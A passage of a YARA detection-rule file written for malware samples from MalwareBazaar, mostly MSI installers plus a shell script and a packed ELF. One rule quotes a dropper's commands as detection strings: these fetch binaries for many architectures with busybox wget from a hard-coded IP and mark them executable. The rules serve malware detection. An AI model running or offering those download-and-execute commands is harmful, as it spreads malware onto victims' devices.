      $s2 = "{$~3~:&\"4" fullword ascii /* hex encoded string '4' */
      $s3 = "agrdtgrhgk" fullword ascii
      $s4 = "0m:\";." fullword ascii
      $s5 = "cLHF%p;u" fullword ascii
      $s6 = "K\\SpYP3" fullword ascii
      $s7 = "p0C6KN" fullword ascii
      $s8 = "# $Uj%" fullword ascii
      $s9 = ";dw*- S" fullword ascii
      $s10 = "1=:gV(+ " fullword ascii
      $s11 = "vrumfc" fullword ascii
      $s12 = ">Ypy* [" fullword ascii
      $s13 = "v; /Zz" fullword ascii
      $s14 = "roductCode{680DAEC0-FB7D-4723-A48D-CAB685AAEA61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s15 = "<p* r3" fullword ascii
      $s16 = " /D7Hw" fullword ascii
      $s17 = ">/< -t>" fullword ascii
      $s18 = "OwLRKz5" fullword ascii
      $s19 = "#RP- G" fullword ascii
      $s20 = "oA -%`" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba {
   meta:
      description = "evidences - file a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "{$~3~:&\"4" fullword ascii /* hex encoded string '4' */
      $s3 = "erwtrhgjgu" fullword ascii
      $s4 = "0m:\";." fullword ascii
      $s5 = "cLHF%p;u" fullword ascii
      $s6 = "K\\SpYP3" fullword ascii
      $s7 = "p0C6KN" fullword ascii
      $s8 = "# $Uj%" fullword ascii
      $s9 = ";dw*- S" fullword ascii
      $s10 = "1=:gV(+ " fullword ascii
      $s11 = "vrumfc" fullword ascii
      $s12 = ">Ypy* [" fullword ascii
      $s13 = "v; /Zz" fullword ascii
      $s14 = "roductCode{680DAEC0-FB7D-4723-A48D-CAB685AAEA61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s15 = "<p* r3" fullword ascii
      $s16 = " /D7Hw" fullword ascii
      $s17 = ">/< -t>" fullword ascii
      $s18 = "OwLRKz5" fullword ascii
      $s19 = "#RP- G" fullword ascii
      $s20 = "oA -%`" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43 {
   meta:
      description = "evidences - file a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AF2C9903-723C-48B7-9266-249B410223FA}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "dgergfjhgk" fullword ascii
      $s4 = "rQ:\"yo[C06" fullword ascii
      $s5 = "cQZ:\\~O" fullword ascii
      $s6 = "*' /e+" fullword ascii
      $s7 = "FJZPnX0" fullword ascii
      $s8 = "5+ @.Z" fullword ascii
      $s9 = "!* :p{" fullword ascii
      $s10 = "V_)t(- WB" fullword ascii
      $s11 = "- `6ESa" fullword ascii
      $s12 = "zDdxzO5" fullword ascii
      $s13 = "Me7U;l* " fullword ascii
      $s14 = "VznKpP7" fullword ascii
      $s15 = "sxrqhm" fullword ascii
      $s16 = "&#fN+ o" fullword ascii
      $s17 = "- <5vI'6" fullword ascii
      $s18 = "T9] + e" fullword ascii
      $s19 = "(* p\\d" fullword ascii
      $s20 = "[Q -_\\Qdi" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864 {
   meta:
      description = "evidences - file b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AF2C9903-723C-48B7-9266-249B410223FA}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "fhrtjhgu" fullword ascii
      $s4 = "rQ:\"yo[C06" fullword ascii
      $s5 = "cQZ:\\~O" fullword ascii
      $s6 = "*' /e+" fullword ascii
      $s7 = "FJZPnX0" fullword ascii
      $s8 = "5+ @.Z" fullword ascii
      $s9 = "!* :p{" fullword ascii
      $s10 = "V_)t(- WB" fullword ascii
      $s11 = "- `6ESa" fullword ascii
      $s12 = "zDdxzO5" fullword ascii
      $s13 = "Me7U;l* " fullword ascii
      $s14 = "VznKpP7" fullword ascii
      $s15 = "sxrqhm" fullword ascii
      $s16 = "&#fN+ o" fullword ascii
      $s17 = "- <5vI'6" fullword ascii
      $s18 = "T9] + e" fullword ascii
      $s19 = "(* p\\d" fullword ascii
      $s20 = "[Q -_\\Qdi" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc {
   meta:
      description = "evidences - file bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AF2C9903-723C-48B7-9266-249B410223FA}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "bdsgeasah" fullword ascii
      $s4 = "rQ:\"yo[C06" fullword ascii
      $s5 = "cQZ:\\~O" fullword ascii
      $s6 = "*' /e+" fullword ascii
      $s7 = "FJZPnX0" fullword ascii
      $s8 = "5+ @.Z" fullword ascii
      $s9 = "!* :p{" fullword ascii
      $s10 = "V_)t(- WB" fullword ascii
      $s11 = "- `6ESa" fullword ascii
      $s12 = "zDdxzO5" fullword ascii
      $s13 = "Me7U;l* " fullword ascii
      $s14 = "VznKpP7" fullword ascii
      $s15 = "sxrqhm" fullword ascii
      $s16 = "&#fN+ o" fullword ascii
      $s17 = "- <5vI'6" fullword ascii
      $s18 = "T9] + e" fullword ascii
      $s19 = "(* p\\d" fullword ascii
      $s20 = "[Q -_\\Qdi" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1 {
   meta:
      description = "evidences - file c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AF2C9903-723C-48B7-9266-249B410223FA}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "wsedferhg" fullword ascii
      $s4 = "rQ:\"yo[C06" fullword ascii
      $s5 = "cQZ:\\~O" fullword ascii
      $s6 = "*' /e+" fullword ascii
      $s7 = "FJZPnX0" fullword ascii
      $s8 = "5+ @.Z" fullword ascii
      $s9 = "!* :p{" fullword ascii
      $s10 = "V_)t(- WB" fullword ascii
      $s11 = "- `6ESa" fullword ascii
      $s12 = "zDdxzO5" fullword ascii
      $s13 = "Me7U;l* " fullword ascii
      $s14 = "VznKpP7" fullword ascii
      $s15 = "sxrqhm" fullword ascii
      $s16 = "&#fN+ o" fullword ascii
      $s17 = "- <5vI'6" fullword ascii
      $s18 = "T9] + e" fullword ascii
      $s19 = "(* p\\d" fullword ascii
      $s20 = "[Q -_\\Qdi" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939 {
   meta:
      description = "evidences - file e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AF2C9903-723C-48B7-9266-249B410223FA}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "dgfhdruhtgk" fullword ascii
      $s4 = "rQ:\"yo[C06" fullword ascii
      $s5 = "cQZ:\\~O" fullword ascii
      $s6 = "*' /e+" fullword ascii
      $s7 = "FJZPnX0" fullword ascii
      $s8 = "5+ @.Z" fullword ascii
      $s9 = "!* :p{" fullword ascii
      $s10 = "V_)t(- WB" fullword ascii
      $s11 = "- `6ESa" fullword ascii
      $s12 = "zDdxzO5" fullword ascii
      $s13 = "Me7U;l* " fullword ascii
      $s14 = "VznKpP7" fullword ascii
      $s15 = "sxrqhm" fullword ascii
      $s16 = "&#fN+ o" fullword ascii
      $s17 = "- <5vI'6" fullword ascii
      $s18 = "T9] + e" fullword ascii
      $s19 = "(* p\\d" fullword ascii
      $s20 = "[Q -_\\Qdi" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule c71b8d66ac2f86177e48df856681cfb53528f1613ca1dae67593a705d7e0ad19 {
   meta:
      description = "evidences - file c71b8d66ac2f86177e48df856681cfb53528f1613ca1dae67593a705d7e0ad19.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "c71b8d66ac2f86177e48df856681cfb53528f1613ca1dae67593a705d7e0ad19"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://91.188.254.21/Kloki.ppc ; chmod 777 ppc ; ." ascii
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://91.188.254.21/Kloki.ppc ; chmod 777 ppc ; ." ascii
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://91.188.254.21/Kloki.spc ; chmod 777 spc ; ." ascii
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://91.188.254.21/Kloki.spc ; chmod 777 spc ; ." ascii
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://91.188.254.21/Kloki.x86_64 ; chmod 777 x" ascii
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://91.188.254.21/Kloki.x86_64 ; chmod 777 x" ascii
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://91.188.254.21/Kloki.arm4 ; chmod 777 arm4 " ascii
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://91.188.254.21/Kloki.x86 ; chmod 777 x86 ; ." ascii
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://91.188.254.21/Kloki.mips ; chmod 777 mips " ascii
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://91.188.254.21/Kloki.mpsl ; chmod 777 mpsl " ascii
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://91.188.254.21/Kloki.arm5 ; chmod 777 arm5 " ascii
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://91.188.254.21/Kloki.mips ; chmod 777 mips " ascii
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://91.188.254.21/Kloki.arm6 ; chmod 777 arm6 " ascii
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://91.188.254.21/Kloki.arm7 ; chmod 777 arm7 " ascii
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://91.188.254.21/Kloki.arm4 ; chmod 777 arm4 " ascii
      $s16 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://91.188.254.21/Kloki.arm6 ; chmod 777 arm6 " ascii
      $s17 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://91.188.254.21/Kloki.mpsl ; chmod 777 mpsl " ascii
      $s18 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://91.188.254.21/Kloki.m68k ; chmod 777 m68k " ascii
      $s19 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://91.188.254.21/Kloki.arm5 ; chmod 777 arm5 " ascii
      $s20 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://91.188.254.21/Kloki.m68k ; chmod 777 m68k " ascii
   condition:
      uint16(0) == 0x6463 and filesize < 4KB and
      8 of them
}

rule f2ce0a7edafc8529958c22022574cab35c4ba4a818214ad3b000488c490c19af {
   meta:
      description = "evidences - file f2ce0a7edafc8529958c22022574cab35c4ba4a818214ad3b000488c490c19af.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "f2ce0a7edafc8529958c22022574cab35c4ba4a818214ad3b000488c490c19af"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $" fullword ascii
      $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "vewYg}KY" fullword ascii
      $s5 = "CvUPX!" fullword ascii
      $s6 = "{jER=h" fullword ascii
      $s7 = ">zt3#h" fullword ascii
      $s8 = "<KD,cl" fullword ascii
      $s9 = "1fLo-<9s" fullword ascii
      $s10 = "%zw8\\ty-" fullword ascii
      $s11 = "kA;C]." fullword ascii
      $s12 = "rOtjLD" fullword ascii
      $s13 = "buB*{I" fullword ascii
      $s14 = "7M\\}x_P" fullword ascii
      $s15 = "[*v!q6L" fullword ascii
      $s16 = "MG@<n#" fullword ascii
      $s17 = "+_K3c=" fullword ascii
      $s18 = "M#H;UM?" fullword ascii
      $s19 = "TB$gsp8" fullword ascii
      $s20 = "BC^1J)" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b_5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b7_0 {
   meta:
      description = "evidences - from files 4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b.msi, 5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1.msi, bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9.msi, c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b"
      hash2 = "5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1"
      hash3 = "bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9"
      hash4 = "c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c"
   strings:
      $s1 = "iRCGs\"" fullword ascii
      $s2 = ";;\"2\"/c=" fullword ascii /* hex encoded string ',' */
      $s3 = "<aRat;<1" fullword ascii
      $s4 = "0HRXC!." fullword ascii
      $s5 = "hJ,R:\\#" fullword ascii
      $s6 = "ME:\"bb" fullword ascii
      $s7 = "?c:\\p-" fullword ascii
      $s8 = "y:\\[['~" fullword ascii
      $s9 = "/6bl:\"" fullword ascii
      $s10 = "f#h1xz:\"" fullword ascii
      $s11 = "+f?S:\\" fullword ascii
      $s12 = "cw/ %i:x" fullword ascii
      $s13 = "{;gw+%cMd" fullword ascii
      $s14 = "e*-irC" fullword ascii
      $s15 = "K;Spy9" fullword ascii
      $s16 = "kr'qgEt2" fullword ascii
      $s17 = "v_1rAT" fullword ascii
      $s18 = "zmiseG1" fullword ascii
      $s19 = "MkZXR01" fullword ascii
      $s20 = " /WOM-Y" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72_2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2_1 {
   meta:
      description = "evidences - from files 254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72.msi, 2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477.msi, 3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e.msi, 636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5.msi, 7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf.msi, 9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c.msi, a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9.msi, a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43.msi, a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba.msi, b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864.msi, b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea.msi, bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc.msi, c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1.msi, e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f.msi, e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939.msi, fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72"
      hash2 = "2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477"
      hash3 = "3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e"
      hash4 = "636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5"
      hash5 = "7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf"
      hash6 = "9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c"
      hash7 = "a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9"
      hash8 = "a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43"
      hash9 = "a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba"
      hash10 = "b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864"
      hash11 = "b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea"
      hash12 = "bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc"
      hash13 = "c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1"
      hash14 = "e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f"
      hash15 = "e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939"
      hash16 = "fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb"
   strings:
      $s1 = "Z+ -TA" fullword ascii
      $s2 = "* z\\3b" fullword ascii
      $s3 = "{0lOGg\\l:" fullword ascii
      $s4 = "BxOVget" fullword ascii
      $s5 = "=]5}C_4E%" fullword ascii /* hex encoded string '\N' */
      $s6 = "*\\*6/\\'E" fullword ascii /* hex encoded string 'n' */
      $s7 = "yyorwpq" fullword ascii
      $s8 = "9gZ.Vkr" fullword ascii
      $s9 = "tmPGj,xW0" fullword ascii
      $s10 = "+&Sr:\\c}" fullword ascii
      $s11 = "Y:\\@(D" fullword ascii
      $s12 = "D{W:\\\\" fullword ascii
      $s13 = ".f:\\hb" fullword ascii
      $s14 = "AUNBAUH" fullword ascii
      $s15 = ";O9%s: " fullword ascii
      $s16 = "Tasbxmm" fullword ascii
      $s17 = "lOGvBi" fullword ascii
      $s18 = "z2P0C\"" fullword ascii
      $s19 = "@+ w?<" fullword ascii
      $s20 = "+}c%__G%" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477_7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd_2 {
   meta:
      description = "evidences - from files 2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477.msi, 7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf.msi, b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477"
      hash2 = "7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf"
      hash3 = "b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{E93670FC-70C1-4A3A-A6C3-64E711B8C9CF}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "4jEcspy(" fullword ascii
      $s4 = "tuS.Qoa" fullword ascii
      $s5 = "}LR1ZfTp" fullword ascii
      $s6 = "JZflE61" fullword ascii
      $s7 = "# qocU" fullword ascii
      $s8 = "-t- >AF" fullword ascii
      $s9 = "+ G:x#Wm" fullword ascii
      $s10 = "yyZKeo1" fullword ascii
      $s11 = "x*- nt" fullword ascii
      $s12 = "jNcTc63" fullword ascii
      $s13 = "JhZXu12" fullword ascii
      $s14 = "bA- j@x" fullword ascii
      $s15 = ",G4]Yb}T+ " fullword ascii
      $s16 = "Q>O* !n" fullword ascii
      $s17 = "Vl%y%Bf" fullword ascii
      $s18 = "vfbB-t+" fullword ascii
      $s19 = "GCLKE`F" fullword ascii
      $s20 = "zvxfh?FW)" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c_a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0_3 {
   meta:
      description = "evidences - from files 9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c.msi, a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c"
      hash2 = "a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "{$~3~:&\"4" fullword ascii /* hex encoded string '4' */
      $s3 = "0m:\";." fullword ascii
      $s4 = "cLHF%p;u" fullword ascii
      $s5 = "K\\SpYP3" fullword ascii
      $s6 = "p0C6KN" fullword ascii
      $s7 = "# $Uj%" fullword ascii
      $s8 = ";dw*- S" fullword ascii
      $s9 = "1=:gV(+ " fullword ascii
      $s10 = "vrumfc" fullword ascii
      $s11 = ">Ypy* [" fullword ascii
      $s12 = "v; /Zz" fullword ascii
      $s13 = "roductCode{680DAEC0-FB7D-4723-A48D-CAB685AAEA61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s14 = "<p* r3" fullword ascii
      $s15 = " /D7Hw" fullword ascii
      $s16 = ">/< -t>" fullword ascii
      $s17 = "OwLRKz5" fullword ascii
      $s18 = "#RP- G" fullword ascii
      $s19 = "oA -%`" fullword ascii
      $s20 = "RMj* G" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43_b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd9_4 {
   meta:
      description = "evidences - from files a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43.msi, b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864.msi, bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc.msi, c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1.msi, e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43"
      hash2 = "b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864"
      hash3 = "bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc"
      hash4 = "c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1"
      hash5 = "e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{AF2C9903-723C-48B7-9266-249B410223FA}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "rQ:\"yo[C06" fullword ascii
      $s4 = "cQZ:\\~O" fullword ascii
      $s5 = "*' /e+" fullword ascii
      $s6 = "FJZPnX0" fullword ascii
      $s7 = "5+ @.Z" fullword ascii
      $s8 = "!* :p{" fullword ascii
      $s9 = "V_)t(- WB" fullword ascii
      $s10 = "- `6ESa" fullword ascii
      $s11 = "zDdxzO5" fullword ascii
      $s12 = "Me7U;l* " fullword ascii
      $s13 = "VznKpP7" fullword ascii
      $s14 = "sxrqhm" fullword ascii
      $s15 = "&#fN+ o" fullword ascii
      $s16 = "- <5vI'6" fullword ascii
      $s17 = "T9] + e" fullword ascii
      $s18 = "(* p\\d" fullword ascii
      $s19 = "[Q -_\\Qdi" fullword ascii
      $s20 = "+ ?(%9$" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5_a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e_5 {
   meta:
